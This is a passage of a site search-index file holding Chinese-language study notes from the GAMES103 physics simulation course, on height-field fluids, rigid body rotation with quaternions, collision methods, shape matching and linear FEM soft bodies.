<p>\u6709\u4e86\u4e00\u4e2a\u5e38\u6570 Hessian \u77e9\u9635\u540e\uff0c\u5269\u4e0b\u90e8\u5206\u548c\u6b63\u5e38\u9690\u5f0f\u79ef\u5206\u6b65\u9aa4\u76f8\u540c\uff1a</p> <p></p> <p>\u6709\u4e00\u4e2a\u5e38\u6570 \\(H\\) \u77e9\u9635\u7684\u6700\u5927\u597d\u5904\u5c31\u662f\u7ebf\u6027\u7cfb\u7edf\u53ea\u7528\u6c42\u89e3\u4e00\u6b21</p> <ul> <li>Advantage\uff1a<ul> <li>\u76f8\u5bf9\u4e8e PBD\uff0c\u5728\u7269\u7406\u4e0a\u6709\u610f\u4e49</li> <li>\u53ea\u9700\u8981\u4e00\u6b21 LU \u5206\u89e3\uff0c\u5728 CPU \u4e0a\u6548\u7387\u9ad8</li> <li>\u5728\u524d\u51e0\u6b21\u8fed\u4ee3\u4e2d\u6536\u655b\u6548\u7387\u8f83\u9ad8\uff08\u8fed\u4ee3\u6b21\u6570\u8d8a\u5c11\u7cbe\u5ea6\u8d8a\u4f4e\uff09</li> </ul> </li> <li>Disadvantage\uff1a<ul> <li>\u5728 GPU \u4e0a\u6162\uff0c\u56e0\u4e3a GPU \u4e0d\u652f\u6301\u76f4\u63a5\u6cd5\u6c42\u89e3\u7ebf\u6027\u7cfb\u7edf</li> <li>\u8fed\u4ee3\u540e\u671f\u7684\u6536\u655b\u901f\u5ea6\u4e0d\u5982\u725b\u987f\u6cd5</li> <li>\u4e0d\u80fd\u7b80\u5355\u5904\u7406\u7ea6\u675f\u6539\u53d8\u7684\u60c5\u51b5</li> </ul> </li> </ul>"},{"location":"Accumulation/Games103/Fluid/","title":"Fluid","text":""},{"location":"Accumulation/Games103/Fluid/#fluid","title":"Fluid","text":"<p> \u7ea6 541 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"},{"location":"Accumulation/Games103/Fluid/#height-field-model","title":"Height Field Model","text":"<p>\u4ee5\u4e8c\u7ef4\u5e73\u9762\u4e3a\u4f8b\uff0c\u6211\u4eec\u6784\u9020\u4e00\u4e2a\u9ad8\u5ea6\u573a\uff0c\u6765\u6a21\u62df\u6c34\u6ce2\u7684\u8d77\u4f0f\uff1a</p> <p></p> <p>\u7531\u4e8e\u4e00\u4e2a x \u53ea\u80fd\u5bf9\u5e94\u4e00\u4e2a y\uff0c\u56e0\u6b64\u8fd9\u5b9e\u9645\u4e0a\u53eb 1.5D</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8d1f\u8d23\u66f4\u65b0\u9ad8\u5ea6 \\(h(x)\\) \u548c\u901f\u5ea6 \\(u(x)\\) \u5373\u53ef\u3002</p> \\[ \\frac{dh(x)}{dt}+ \\frac{d(h(x)u(x))}{dx} = 0 \\Leftrightarrow \\frac{dh(x)}{dt}+ h(x)\\frac{du(x)}{dx} = 0 \\] <p>\u5176\u4e2d \\(d(h(x)u(x))\\) \u8868\u793a\u5728 \\(dx\\) \u8303\u56f4\u5185\uff0c\u5355\u4f4d\u65f6\u95f4\u6c34\u91cf\u7684\u53d8\u5316\u3002\u5229\u7528\u79ef\u5206\u7684\u94fe\u5f0f\u6cd5\u5219\u62c6\u5f00\uff0c\u5e76\u4e14\u5ffd\u7565\u6389\u5f88\u5c0f\u7684 \\(u(x)\\frac{dh(x)}{dx}\\) \u540e\u5f97\u5230\u540e\u4e00\u4e2a\u7b80\u5316\u7248\u7b49\u5f0f\u3002</p> \\[ \\frac{du(x)}{dt}=-\\frac{1}{\\rho} \\frac{dP(x)}{dx} \\] <p>\u5176\u4e2d \\(\\rho\\) \u662f\u5bc6\u5ea6\uff0c\\(P\\) \u662f\u538b\u5f3a\u3002\u6b64\u5904\u5ffd\u7565\u4e86\u5916\u529b\u7b49\u56e0\u7d20\uff0c\u6211\u4eec\u5728 lab4 \u4e2d\u4f7f\u7528\u538b\u5f3a\u6765\u6a21\u62df\u6c34\u7684\u6548\u679c\u3002</p> <p></p> <p>\u5bf9\u4e8e\u4e8c\u9636\u5bfc\u6570\uff0c\u6211\u4eec\u7684\u6c42\u6cd5\u662f\u8fdb\u884c\u6cf0\u52d2\u5c55\u5f00\u5f97\u5230\u8fd1\u4f3c\u503c\uff1a</p> \\[\\begin{array}l f(t_0 +\\Delta t) = f(t_0) + \\Delta t \\frac{df(t_0)}{dt} + \\frac{\\Delta t^2 }{2} \\frac{d^2f(t_0)}{dt ^2} +... \\\\ f(t_0 -\\Delta t) = f(t_0) - \\Delta t \\frac{df(t_0)}{dt} + \\frac{\\Delta t^2 }{2} \\frac{d^2f(t_0)}{dt ^2} +... \\end{array}\\] <p>\u6240\u4ee5\uff1a</p> \\[ \\frac{d^2h(t)}{d t^2} = \\frac{h(t_0+\\Delta t) + h(t_0-\\Delta t)- 2h(t_0)}{\\Delta t^2} \\] <p>\u6700\u7ec8\u5f97\u5230\u5982\u4e0b\u66f4\u65b0\u65b9\u7a0b\uff1a</p> <p></p> <p>\u4ec5\u4ec5\u662f\u8fd9\u6837\uff0c\u65e0\u6cd5\u6ee1\u8db3\u603b\u6c34\u91cf\u662f\u4e0d\u53d8\u7684\u6761\u4ef6\uff0c\u5373 \\(\\sum h = V\\) \uff0c\u6709\u4e24\u79cd\u5bf9\u5e94\u89e3\u51b3\u65b9\u6cd5\uff1a</p> <p></p> <p>\u5728 lab4 \u4e2d\uff0c\u6211\u4eec\u91c7\u7528 Solution 2 \u7684\u5f62\u5f0f\uff0c\u5c06 \\(\\frac{\\Delta t^2 Hg}{\\Delta x^2 \\rho}\\) \u8bb0\u4e3a\u5e38\u6570 \\(\\alpha\\)\uff08\\(P=hg\\)\uff09\uff0c\u5e76\u4e3a \\(h_i( t_0) - h_i( t_0 -\\Delta  t)\\) \u4e58\u4e0a\u7c98\u6ede\u5e38\u6570 Viscosity \\(\\beta\\)\uff1a</p> \\[ h_i (t_0+ \\Delta t) = h_i( t_0) +\\beta (h_i( t_0) - h_i( t_0 -\\Delta t)) + \\alpha (h_{i+1} (t_0) + h_{i-1} (t_0) - 2h_i (t_0)) \\] <p>Boundary Condtion</p> <p>\u9047\u5230\u8fb9\u754c\u600e\u4e48\u5904\u7406\uff1f</p> <ul> <li>&lt;1&gt; \u8ba4\u4e3a\u8fb9\u754c\u5916 \\(h\\) \u4e3a\u5e38\u6570</li> <li>&lt;2&gt; \u8ba4\u4e3a\u8fb9\u754c\u5916\u7684 \\(h\\) \u4e0e\u7b49\u4e8e\u8fb9\u754c\u4e0a\u7684\u503c\uff0c\u5982 \\(h_{i+1} = h_i\\)</li> </ul> <p></p> <p>\u63a5\u4e0b\u6765\u5f00\u59cb\u8003\u8651\u521a\u4f53\u6392\u6c34\u5bfc\u81f4\u7684\u9ad8\u5ea6\u53d8\u5316\u8fd9\u4e2a\u95ee\u9898\u3002\u6211\u4eec\u4e3a\u6392\u6c34\u5904\u8bbe\u7f6e\u4e00\u4e2a\u865a\u62df\u9ad8\u5ea6\uff0c\u6765\u6a21\u62df\u6392\u6c34\u9020\u6210\u7684\u6c34\u6ce2\uff0c\u6709\u516c\u5f0f\uff1a</p> <p></p> <p>\u603b\u4e4b\uff0c\u6700\u540e\u89e3\u51fa \\(v\\)\uff0c\u518d\u6839\u636e \\(v\\) \u6765\u66f4\u65b0\u9ad8\u5ea6\uff0c\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Accumulation/Games103/Fluid/#eulerian-fluids","title":"Eulerian Fluids","text":""},{"location":"Accumulation/Games103/Rigid%20Body/","title":"Rigid Body","text":""},{"location":"Accumulation/Games103/Rigid%20Body/#rigid-body","title":"Rigid Body","text":"<p> \u7ea6 1597 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Accumulation/Games103/Rigid%20Body/#rigid-body-dynamic","title":"Rigid Body Dynamic","text":"<p>\u521a\u4f53\u6a21\u62df\u662f\u975e\u5e38\u91cd\u8981\u3001\u57fa\u7840\u7684\uff0c\u56e0\u6b64\u4e00\u822c\u6e38\u620f\u5f15\u64ce\u90fd\u4f1a\u9ed8\u8ba4\u63d0\u4f9b\u3002\u672c\u8bfe\u7a0b\u65e8\u5728\u5b66\u4e60\u5b83\u662f\u5982\u4f55\u8fd0\u4f5c\u7684\uff0c\u800c\u4e0d\u662f\u5982\u4f55\u4f7f\u7528\u5b83\u3002</p> <p>\u521a\u4f53\u6a21\u62df\u672c\u8d28\u4e0a\u662f\u53bb\u66f4\u65b0\u63cf\u8ff0\u7269\u4f53\u72b6\u6001\u7684\u53d8\u91cf</p> <p></p> <p>\u5bf9\u4e8e\u521a\u4f53\uff0c\u53ea\u5141\u8bb8\u5b83\u505a\u5e73\u79fb\u548c\u65cb\u8f6c\u4e24\u79cd\u4e0d\u5f71\u54cd\u7269\u4f53\u5f62\u53d8\u7684\u53d8\u5316\u3002</p>"},{"location":"Accumulation/Games103/Rigid%20Body/#translational-motion","title":"Translational Motion","text":"\\[ \\begin{cases}v(t^{[1]}) = v(t^{[0]}) + M^{-1} \\int_{ t^{[0]}} ^{t ^{[1]}} f(x(t), v(t), t)dt  \\\\ x(t^{[1]})  =x (t ^{[0]}) + \\int_{ t^{[0]}} ^{t ^{[1]}} v(t)dt \\end{cases} \\] <p>\u5176\u4e2d \\(M\\) \u4ee3\u8868\u8d28\u91cf\uff0c\\(f(x(t), v(t), t)\\) \u4ee3\u8868 t \u65f6\u523b\u521a\u4f53\u6240\u53d7\u7684\u529b\uff0c\u90a3\u4e48\u901f\u5ea6\u7684\u540e\u534a\u6bb5\u5c31\u8868\u793a\u52a0\u901f\u5ea6\u5173\u4e8e\u65f6\u95f4\u7684\u79ef\u5206\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u4e0a\u8ff0\u4e8c\u5143\u65b9\u7a0b\u6709\u4e24\u4e2a\u53d8\u91cf \\(x(t)\\) \u548c \\(v(t)\\)\uff0c\u5b83\u4eec\u7684\u66f4\u65b0\u4e4b\u95f4\u9700\u8981\u4e92\u76f8\u4f9d\u8d56\u3002\u4e3a\u4e86\u4f7f\u5176\u53ef\u89e3\uff0c\u5219\u5fc5\u987b\u820d\u5f03\u4e00\u4e9b\u7cbe\u5ea6\uff1a</p> \\[ \\begin{cases}v^{[1]} = v^{[0]} + \\Delta t M^{-1} f^{[0]}  &amp; \\text{Explicit}\\\\ x^{[1]} = x^{[0]} + \\Delta t v^{[1]} &amp; \\text{Implicit}  \\end{cases} \\] <p>Air Drag Force</p> <p>\u7a7a\u6c14\u963b\u529b\u5927\u5c0f\u901a\u5e38\u4e0e\u901f\u5ea6\u6210\u6b63\u6bd4\uff0c\u4e0d\u8fc7\u5728\u4e00\u4e9b\u7b80\u5355\u6a21\u62df\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5355\u7eaf\u8ba4\u4e3a\u7a7a\u6c14\u963b\u529b\u7684\u4f5c\u7528\u4ec5\u4e3a\u7ed9\u901f\u5ea6\u4e58\u4e0a\u4e86\u4e00\u4e2a\u7cfb\u6570\uff0c\u5373 \\(v^{[1]} = \\alpha v^{[0]}\\)\uff0c\u5176\u4e2d \\(\\alpha\\) \u4e3a decay coefficients(\u8870\u51cf\u7cfb\u6570)\u3002</p>"},{"location":"Accumulation/Games103/Rigid%20Body/#rotation","title":"Rotation","text":"<p>\u65cb\u8f6c\u53ef\u4ee5\u7528\u77e9\u9635\u8868\u793a\uff0c\u4f46\u662f\u5728\u521a\u4f53\u6a21\u62df\u4e2d\uff0c\u65cb\u8f6c\u77e9\u9635\u662f\u975e\u5e38\u5197\u4f59\u3001\u4e0d\u76f4\u89c2\u3001\u96be\u4ee5\u5b9a\u4e49\u7684\u3002</p> <p>\u5728\u8bbe\u8ba1\u4e0e\u673a\u68b0\u63a7\u5236\u4e2d\uff0c\u5e38\u91c7\u7528 Euler Angles \u7684\u65b9\u5f0f\u8868\u793a\u65cb\u8f6c\uff0c\u5728 Unity \u4e2d\uff0c\u5206\u522b\u4e3a rotation-by-Z\uff0crotation-by-X\uff0crotation-by-Y\u3002</p> <p>\u4f46\u6b27\u62c9\u89d2\u540c\u6837\u5b58\u5728\u95ee\u9898\uff0c\u4f8b\u5982 Gimbal Lock\uff0c\u5728\u67d0\u4e9b\u7279\u5b9a\u60c5\u5f62\u4e0b\uff0c\u7269\u4f53\u7684\u65cb\u8f6c\u81ea\u7531\u5ea6\u4f1a\u51cf\u5c11(\u591a\u6761\u65cb\u8f6c\u8f74\u91cd\u5408\u5728\u4e00\u8d77)\uff1a</p> <p></p> <p>\u56e0\u6b64\u6211\u4eec\u5f15\u5165\u56db\u5143\u6570 Quaternion\uff0c\u5176\u7279\u70b9\u662f\u7c7b\u4f3c\u4e8e\u865a\u6570\uff0c\u8fd8\u53ef\u4ee5\u8fdb\u884c\u9664\u6cd5\u64cd\u4f5c\uff0c\u4e0b\u9762\u4e00\u5f20\u8868\u5b9a\u4e49\u4e86\u5176\u4e58\u6cd5\u89c4\u5219\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u56db\u5143\u6570 \\(q=[s, v]\\)\uff0c\u90e8\u5206\u8fd0\u7b97\u89c4\u5219\u5982\u4e0b\uff1a</p> \\[\\begin{array}l aq = [as, av] \\\\ q_1 + q_2 = [s_1 + s_2, v_1 + v_2]\\\\ q_1 \\times q_2 =[ s_1 \\times s_2 - v_1 \\times v_2, s_1 v_2 + s_2 v_1 + v_1 \\times v_2] \\\\ ||q|| = \\sqrt{s^2 + v\\cdot v} \\end{array}\\] <p>\u5176\u4e2d s \u6307\u5b9e\u6570\u90e8\u5206\uff0cv \u6307\u865a\u6570\u90e8\u5206\uff08\u5305\u62eci j k\uff09</p> <p>\u7528\u56db\u5143\u6570\u6765\u8868\u793a\u65cb\u8f6c\uff0c\u865a\u6570\u90e8\u5206\u8868\u793a\u65cb\u8f6c\u8f74\uff0c\u5b9e\u6570\u90e8\u5206\u8868\u793a\u65cb\u8f6c\u89d2\u5ea6\uff1a</p> \\[ \\begin{cases}q=[\\cos \\frac{\\theta}{2}, v] \\\\ ||q||=1 \\end{cases} \\] <p>\u5728 Unity \u4e2d\uff0c\u867d\u7136\u754c\u9762\u4e0a\u91c7\u7528\u6b27\u62c9\u89d2\u7684\u65b9\u5f0f\u8868\u793a\u65cb\u8f6c\uff0c\u4f46\u5176\u5185\u90e8\u903b\u8f91\u4ecd\u7136\u662f Quaternion\u3002</p> <p>\u4eff\u7167 Translation\uff0c\u8f6c\u52a8\u53ef\u4ee5\u7528\u89d2\u901f\u5ea6\u3001\u529b\u77e9\u4ee5\u53ca\u8f6c\u52a8\u60ef\u91cf\u6765\u8868\u793a\uff1a</p> \\[ \\begin{cases}\\omega^{[1]} = \\omega^{[0]} + \\Delta t (I^{[0]}) ^{-1} \\uptau^{[0]} \\\\ q^{[1]} = q^{[0]} + \\left[0, \\frac{\\Delta t}{2} \\omega^{[1]} \\right]\\times q^{[0]} \\end{cases} \\] <p>\u5176\u4e2d\u4e0b\u534a\u90e8\u5206 \\(q\\) \u8868\u793a Quaternion\uff0c\u5728 Unity \u4e2d\u5df2\u7ecf\u5b9a\u4e49\u4e86\u56db\u5143\u6570\u4e4b\u95f4\u7684\u4e58\u6cd5\uff0c\u4f46\u662f\u6ca1\u6709\u5b9a\u4e49\u52a0\u6cd5\uff0c\u9700\u8981\u81ea\u5df1\u5199\u3002</p> <p>\u6839\u636e\u4ee5\u4e0a\u601d\u60f3\uff0c\u53ef\u4ee5\u5f97\u51fa\u5176\u6a21\u62df\u51fd\u6570\u5927\u81f4\u4e3a\uff1a</p> <p></p>"},{"location":"Accumulation/Games103/Rigid%20Body/#rigid-collision-detection-and-response","title":"Rigid Collision Detection and Response","text":""},{"location":"Accumulation/Games103/Rigid%20Body/#penalty-method","title":"Penalty Method","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u8ddd\u79bb\u51fd\u6570\u5bf9\u7269\u4f53\u505a\u78b0\u649e\u68c0\u6d4b\u3002\u5f53\u8ddd\u79bb\u4e3a\u8d1f\u65f6\uff0c\u8ba4\u4e3a\u53d1\u751f\u4e86\u78b0\u649e\uff1b\u4e3a\u6b63\u65f6\uff0c\u5219\u6ca1\u6709\u78b0\u649e\u3002</p> <p>\u78b0\u649e\u65f6\u4ea7\u751f\u7684\u529b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8ba4\u4e3a\u4e00\u79cd\u7c7b\u5f39\u7c27\u7684\u7ed3\u6784\uff0c\u8ddd\u79bb\uff08\u8d1f\u6570\uff09\u8d8a\u5927\uff0c\u529b\u8d8a\u5927\u3002\u4f46\u662f\u8fd9\u6837\u5b50\u5224\u65ad\u7684\u7f3a\u70b9\u662f\u53ea\u6709\u8ddd\u79bb\u4e3a\u8d1f\u6570\u65f6\u624d\u4f1a\u4ea7\u751f\u529b\uff0c\u4e00\u79cd\u5904\u7406\u65b9\u5f0f\u662f\u4e3a\u8868\u9762\u589e\u52a0\u4e00\u4e2a Buffer\uff0c\u5728 Buffer \u8303\u56f4\u5185\u65f6\u5c31\u5f00\u59cb\u4ea7\u751f\u53cd\u51b2\u529b\uff1a</p> <p></p> <p>\u8fd9\u6837\u5b50\uff0ck \u7684\u53d6\u503c\u662f\u4e00\u4e2a\u91cd\u8981\u7684\u8bae\u9898\uff0c\u4e00\u79cd\u601d\u8003\u65b9\u5f0f\u662f\u8d8a\u63a5\u8fd1\u8868\u9762\uff0c\u7269\u4f53\u6240\u53d7\u7684\u529b\u5c31\u8d8a\u5927\uff0c\u751a\u81f3\u65e0\u7a77\u5927\u3002\u8fd9\u79cd Penalty Method \u79f0\u4e3a Log-Barrier\uff1a</p> <p></p> <p>\u5728Log-Barrier\u4e2d\uff0c\u5982\u679c\u8ddd\u79bb\u4e3a\u8d1f\u6570\uff0c\u6b64\u65f6\u529b\u4e5f\u662f\u5411\u5185\u7684\uff0c\u7269\u4f53\u4f1a\u8d8a\u6765\u8d8a\u6df1\u3002\u56e0\u6b64\u9700\u8981\u5047\u5b9a\u7a7f\u900f\u662f\u4e0d\u53d1\u751f\u7684</p> <p>\u4e3a\u4e86\u4fdd\u8bc1\u4e0d\u7a7f\u900f\uff0c\u5219\u6b65\u957f \\(\\Delta t\\) \u8981\u5c3d\u53ef\u80fd\u5c0f\uff0c\u540c\u65f6\u5e26\u6765\u4e86\u66f4\u9ad8\u7684\u6210\u672c</p>"},{"location":"Accumulation/Games103/Rigid%20Body/#impulse-method","title":"Impulse Method","text":"<p>\u5728 Penalty Method \u4e2d\uff0c\u78b0\u649e\u540e\u65bd\u52a0\u7684\u529b\u9700\u8981\u5728\u4e0b\u4e00\u4e2a \\(\\Delta t\\) \u4e2d\u624d\u80fd\u8d77\u4f5c\u7528\uff0cImpulse Method \u5219\u60f3\u529e\u6cd5\u5728\u78b0\u649e\u53d1\u751f\u65f6\u7acb\u5373\u66f4\u65b0\u901f\u5ea6\u548c\u4f4d\u7f6e\u3002\u5176\u601d\u60f3\u662f\u5f53\u8ddd\u79bb\u53d8\u6210\u8d1f\u6570\u65f6\uff0c\u7acb\u5373\u5c06\u5176\u66f4\u65b0\u4e3a 0\uff08\u5373\u8868\u9762\uff09\uff0c\u800c\u901f\u5ea6\u7684\u66f4\u65b0\u5219\u7531\u66f4\u7b26\u5408\u7269\u7406\u5b66\u7684\u65b9\u5f0f\uff0c\u5206\u522b\u4e58\u4ee5\u53cd\u5f39\u7cfb\u6570\u548c\u6469\u64e6\u7cfb\u6570\uff1a</p> VelocityPosition <p></p> <p></p>"},{"location":"Accumulation/Games103/Rigid%20Body/#rigid-body_1","title":"Rigid Body","text":"<p>\u4e0a\u8ff0\u4e24\u5c0f\u8282\u6240\u8bb2\u7684\u201c\u7269\u4f53\u201d\u90fd\u662f\u9488\u5bf9\u4e00\u4e2a\u5c0f\u7403\u7684\uff0c\u800c\u4e00\u4e2a\u771f\u6b63\u7684\u6a21\u578b\u662f\u7531\u5f88\u591a Vertex \u7ec4\u6210\u7684\u3002\u5bf9\u4e8e\u5355\u4e2a Vertex \u7684\u4f4d\u7f6e\u548c\u901f\u5ea6\u72b6\u6001\uff1a</p> \\[ \\begin{cases}x_i = x+ Rr_i &amp; :Position\\\\ v_i = v + \\omega \\times Rr_i &amp; : Velocity\\end{cases} \\] <p>\u5176\u4e2d \\(x,v\\) \u5206\u522b\u4e3a\u8d28\u5fc3\u7684\u4f4d\u7f6e\u3001\u7ebf\u901f\u5ea6\uff0c\\(R\\) \u662f\u4e00\u4e2a Rotation \u77e9\u9635</p> <p>\u6211\u4eec\u9700\u8981\u66f4\u65b0\u7684\u72b6\u6001\u4e3a \\(v,\\omega\\)\uff0c\u5728 \\(\\Delta t\\) \u4e2d\u78b0\u649e\u4ea7\u751f\u7684 impulse \u51b2\u91cf \\(j\\)\uff0c\u65bd\u52a0\u5728\u9876\u70b9 \\(i\\) \u4e0a\u4ea7\u751f\u5982\u4e0b\u6548\u679c\uff1a</p> <p></p> <p>\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u6211\u4eec\u8ba4\u4e3a \\(Rr_i\\) \u662f\u4e00\u4e2a\u56db\u5143\u77e9\u9635\uff0c\u7c7b\u4f3c\u4e8e\u56db\u5143\u6570\u7684\u5f62\u5f0f</p> <p>\u4e3a\u4e86\u7b80\u5316\u8fd9\u4e00\u5f0f\u5b50\uff0c\u6211\u4eec\u8bb2 cross product \u8f6c\u6362\u6210\u77e9\u9635\u5f62\u5f0f\uff0c\u5b9a\u4e49\uff1a</p> \\[ r\\times q= \\left [\\begin{matrix} r_y q_z - r_z q_y \\\\ r_z q_x - r_x q_z \\\\ r_x q_y -r_y q_x\\end{matrix}\\right ] = \\left [\\begin{matrix} 0 &amp; - r_z  &amp; r_y\\\\ r_z &amp; 0 &amp; -r_x \\\\ -r_y  &amp; r_x &amp; q_x\\end{matrix}\\right ] \\left [\\begin{matrix} q_x \\\\ q_y \\\\ q_z\\end{matrix}\\right ] :=r^*q \\] <p>\u7531\u4e8e\u5bf9\u4e8e\u8be5\u9876\u70b9 \\(i\\)\uff0c\\(v_i ^{new}\\) \u662f\u5df2\u77e5\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u5148\u6839\u636e\u4e0a\u5f0f\u6765\u8ba1\u7b97\u51fa impulse \\(j\\)\uff0c\u518d\u4f7f\u7528 \\(j\\) \u66f4\u65b0\u8d28\u5fc3\u7684 \\(v,\\omega\\)\u3002</p> <p></p> <p>\u5982\u679c\u6709\u591a\u4e2a Vertex \u540c\u65f6\u53d1\u751f\u78b0\u649e\uff0c\u4e00\u822c\u53d6\u5e73\u5747\u503c</p>"},{"location":"Accumulation/Games103/Rigid%20Body/#shape-matching","title":"Shape Matching","text":"<p>Shape Matching \u6362\u4e86\u79cd\u601d\u8def\uff0c\u5148\u8ba9\u6bcf\u4e2a Vertex \u90fd\u6839\u636e\u5b83\u4eec\u81ea\u5df1\u7684 Position \u548c Velocity \u8fd0\u52a8\u3001\u78b0\u649e\uff0c\\(\\Delta t\\) \u65f6\u95f4\u540e\u5c06\u8fd9\u4e9b\u70b9\u6062\u590d\u6210\u8be5\u521a\u4f53\u7684\u5f62\u72b6\uff1a</p> <p></p> <p>\u90a3\u4e48\u95ee\u9898\u5c31\u5728\u4e8e\u5982\u4f55\u5c06 Vertex \u6062\u590d\u6210\u539f\u6765\u7684\u5f62\u72b6\u3002\u5047\u8bbe\u78b0\u649e\u540e\u67d0\u70b9\u7684\u4f4d\u7f6e\u4e3a \\(y_i\\)\uff0c\u8c03\u6574\u540e\u6700\u7ec8\u7684\u4f4d\u7f6e\u4e3a \\(x_i =c+Rr_i\\)\uff0c\u5176\u4e2d\u53ea\u6709 \\(y_i\\) \u548c \\(r_i\\) \u662f\u6211\u4eec\u7684\u5df2\u77e5\u91cf\u3002\u6211\u4eec\u5e0c\u671b\u4e0b\u5217\u5f0f\u5b50\u7684\u503c\u80fd\u591f\u6700\u5c0f\uff1a</p> \\[ \\sum_i \\frac{1}{2} ||c+Rr_i-y_i ||^2 \\] <p>\u5206\u522b\u5bf9 \\(c\\) \u548c \\(R\\) \u6c42\u5bfc\uff0c\u53d6\u4e00\u9636\u5bfc\u6570\u7b49\u4e8e 0 \u7684\u70b9\uff1a</p> \\[ \\begin{cases} c = \\frac{1}{N}\\sum_i y_i \\\\ R = \\left(\\sum_i (y_i-c) r_i^T\\right) \\left(\\sum_i r_i r_i^T \\right)^{-1} \\end{cases} \\] <p>\u4f46\u662f\u5bf9\u4e8e\u65cb\u8f6c\u77e9\u9635 \\(R\\)\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5de6\u534a\u65cb\u8f6c\u90e8\u5206\uff0c\u629b\u5f03\u53f3\u534a\u5f62\u53d8\u90e8\u5206\u3002</p> <p></p>"},{"location":"Accumulation/Games103/Soft%20Body/","title":"Soft Body","text":""},{"location":"Accumulation/Games103/Soft%20Body/#soft-body","title":"Soft Body","text":"<p> \u7ea6 2051 \u4e2a\u5b57  14 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p>"},{"location":"Accumulation/Games103/Soft%20Body/#linear-finite-element-method-fem","title":"Linear Finite Element Method (FEM)","text":"<p>Linear Element \u6307\u7684\u662f\u4e09\u89d2\u5f62\uff08\u4e8c\u7ef4\uff09\u6216\u8005\u56db\u9762\u4f53\uff08\u4e09\u7ef4\uff09\u3002\u5728 Linear Element \u5c42\u9762\u4e0a\uff0c\u56fe\u5f62\u5b66\u7684\u6709\u9650\u5143\u548c\u673a\u68b0\u4e0a\u7684\u6709\u9650\u5143\u662f\u4e00\u6837\u7684\u3002</p> <p>\u79f0\u4e09\u89d2\u5f62\u9759\u6b62\u72b6\u6001\u4e3a Reference\u3002\u5728 FEM \u4e2d\u6211\u4eec\u5047\u8bbe\u4e09\u89d2\u5f62\u5185\u90e8\u5f62\u53d8\u662f\u5747\u5300\u7684\uff0c\u5373\u4e09\u89d2\u5f62\u5185\u90e8\u4efb\u610f\u70b9 \\(X\\) \u5f62\u53d8\u540e\u7684\u5750\u6807\u53ef\u4ee5\u7528 \\(x=FX+c\\) \u6765\u8868\u793a\u3002</p> <p>\\(F\\) \u4e5f\u88ab\u79f0\u4e3a\u5f62\u53d8\u68af\u5ea6 Deformation Gradient\uff0c\u56e0\u4e3a \\(F=\\partial x /\\partial X\\)</p> <p>\u6211\u4eec\u53ef\u4ee5\u9009\u53d6\u4e09\u89d2\u5f62\u5185\u90e8\u4e00\u4e2a\u77e2\u91cf\u7684\u524d\u540e\u53d8\u6362\u6765\u8ba1\u7b97\u5f97\u5230 \\(F\\)\uff0c\u4f8b\u5982 \\(F=[x_{10}, x_{20}][ X_{10}, X_{20}]^{-1}\\)</p> <p>\u7531\u4e8e\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u4e00\u4e2a\u53ea\u63cf\u8ff0\u4e86\u5f62\u53d8\u7684\u77e9\u9635\uff0c\u4e0d\u5e0c\u671b\u5305\u542b\u4e09\u89d2\u5f62\u7684\u65cb\u8f6c\u4fe1\u606f\u3002\u6211\u4eec\u77e5\u9053\uff0c\u5728 SVD \u4e2d\uff0c\u4e00\u4e2a\u4e09\u89d2\u5f62\u7684\u53d8\u6362 \\(F=UDV^T\\) \u7531 \\(Rotation: V^{T},\\ Scaling: D,\\ Rotation:U\\) \u7ec4\u6210\uff0c\u4e3a\u4e86\u6d88\u9664 \\(U\\) \u7684\u5f71\u54cd\uff0c\u5f15\u5165\u4e00\u4e2a\u65b0\u7684\u6982\u5ff5 Green Strain\uff1a</p> \\[ G= \\frac{1}{2}(F^TF-I) =\\frac{1}{2}(V D^2 V^T-I)= \\left [\\begin{matrix}\\varepsilon_{uu} &amp; \\varepsilon_{uv} \\\\ \\varepsilon_{uv} &amp; \\varepsilon_{vv} \\end{matrix} \\right ] \\] <p>\u65e0\u5f62\u53d8\u65f6\uff0c\\(G=0\\)\uff1b\\(||G||\\) \u4e0e\u5f62\u53d8\u7a0b\u5ea6\u6b63\u76f8\u5173</p> <p>\u6709\u4e86\u5f62\u53d8\u77e9\u9635\u540e\uff0c\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u4e09\u89d2\u5f62\u67d0\u4e00\u5f62\u53d8\u72b6\u6001\u4e0b\u7684\u80fd\u91cf\uff0c\u5b9a\u4e49\u4e09\u89d2\u5f62 Reference \u72b6\u6001\u4e0b\u7684\u80fd\u91cf\u5bc6\u5ea6\u4e3a \\(W(G)\\)\uff0c\u603b\u80fd\u91cf\u4e3a\u9762\u79ef\u4e58\u4ee5\u80fd\u91cf\u5bc6\u5ea6 \\(E=A^{ref}W(G)\\)</p> <p>Saint Venant-Kirchhoff Model, StVK \u80fd\u91cf\u5bc6\u5ea6\u6a21\u578b</p> \\[\\begin{array}lW(G)=W(\\varepsilon_{uu}, \\varepsilon_{vv}, \\varepsilon_{uv})=\\frac{\\lambda}{2}(\\varepsilon_{uu} + \\varepsilon_{vv})^2 + \\mu(\\varepsilon_{uu}^2 +\\varepsilon_{vv}^2 + 2\\varepsilon_{uv}^2)\\\\ S=\\frac{\\partial W(G)}{\\partial G} = 2\\mu G+ \\lambda trace(G)I\\end{array}\\] <p>\u5b9a\u4e49\u4e86\u80fd\u91cf\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u80fd\u8ba1\u7b97\u5f62\u53d8\u65f6\u4f5c\u7528\u7684\u529b\u4e86:</p> \\[ f_i=- \\left(\\frac{\\partial E}{\\partial x_i}\\right)^T = -A^{ref} \\left(\\frac{\\partial W}{\\partial x_i}\\right)^T= -A^{ref} \\left(\\frac{\\partial 